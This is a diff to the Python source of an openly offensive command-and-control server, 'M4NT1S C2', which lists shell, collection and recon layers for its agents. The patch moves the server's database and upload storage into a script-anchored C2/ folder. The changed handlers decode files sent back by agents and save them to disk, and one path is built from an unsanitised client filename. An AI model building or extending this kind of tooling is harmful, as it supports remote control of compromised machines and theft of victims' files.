@@ -3,6 +3,15 @@
 M4NT1S C2 Server — Layer 0 (Console) / Layer 1 (Shell) / Layer 2 (Collect) / Layer 3 (Recon)
 - Stream: frames POST to /api/v1/stream, GUI shows latest at wire rate
 - KILLSWITCH: agent self-terminates after posting its final result
+
+DATA LOCATION:
+  DB_FILE  = <script dir>/C2/c2.db
+  ID_FILE  = <script dir>/C2/slave_ids.json
+  uploads  = <script dir>/C2/uploads/
+  The C2/ folder is created automatically. Paths are anchored to the script's
+  own directory (via __file__) so it does not matter which folder you launch
+  from. This prevents the "two c2.db files, one empty" bug where a relative
+  path resolved to the wrong working directory.
 """
 
 import sqlite3
@@ -28,9 +37,16 @@ warnings.filterwarnings("ignore")
 from logging.handlers import QueueHandler
 from flask import Flask, request, jsonify
 
+# ---------------------------------------------------------------------------
+# PATHS - anchored to this script's directory, not the current working dir.
+# ---------------------------------------------------------------------------
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DATA_DIR = os.path.join(BASE_DIR, 'C2')
+os.makedirs(DATA_DIR, exist_ok=True)
+
 app = Flask(__name__)
-DB_FILE = 'c2.db'
-ID_FILE = 'slave_ids.json'
+DB_FILE = os.path.join(DATA_DIR, 'c2.db')
+ID_FILE = os.path.join(DATA_DIR, 'slave_ids.json')
 SERVER_URL = 'http://127.0.0.1:5000'
 
 log_queue = queue.Queue()
@@ -458,8 +474,9 @@ def result():
             fname, b64 = rest.split(":", 1)
             fname = os.path.basename(fname) or f"task_{task_id}.bin"
             data_bytes = base64.b64decode(b64)
-            os.makedirs('uploads', exist_ok=True)
-            fpath = f"uploads/task_{task_id}_{fname}"
+            uploads_dir = os.path.join(DATA_DIR, 'uploads')
+            os.makedirs(uploads_dir, exist_ok=True)
+            fpath = os.path.join(uploads_dir, f"task_{task_id}_{fname}")
             with open(fpath, 'wb') as f:
                 f.write(data_bytes)
             session_log_queue.put(f"[FILE] {fpath} ({len(data_bytes)} bytes) from ID {numeric_id:04d}")
@@ -558,8 +575,9 @@ def upload():
     file = request.files.get('file')
     if not file:
         return jsonify({"error": "Missing file"}), 400
-    os.makedirs('uploads', exist_ok=True)
-    filepath = f"uploads/task_{task_id}_{file.filename}"
+    uploads_dir = os.path.join(DATA_DIR, 'uploads')
+    os.makedirs(uploads_dir, exist_ok=True)
+    filepath = os.path.join(uploads_dir, f"task_{task_id}_{file.filename}")
     file.save(filepath)
     log_queue.put(f"[UPLOAD] {filepath}")
     return jsonify({"status": "ok"})
